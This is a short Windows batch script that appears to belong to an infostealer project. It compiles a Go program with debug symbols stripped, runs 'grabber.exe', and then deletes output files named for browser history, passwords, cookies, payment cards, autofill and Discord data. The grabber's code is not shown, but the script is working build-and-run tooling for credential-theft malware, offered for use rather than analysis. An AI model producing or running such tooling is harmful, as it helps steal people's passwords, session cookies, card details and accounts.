@echo off

go build -ldflags "-s -w"

grabber.exe

del history.json
del passwords.json
del cookies.json
del cards.json
del downloads.json
del autofill.json
del discord.json

pause
exit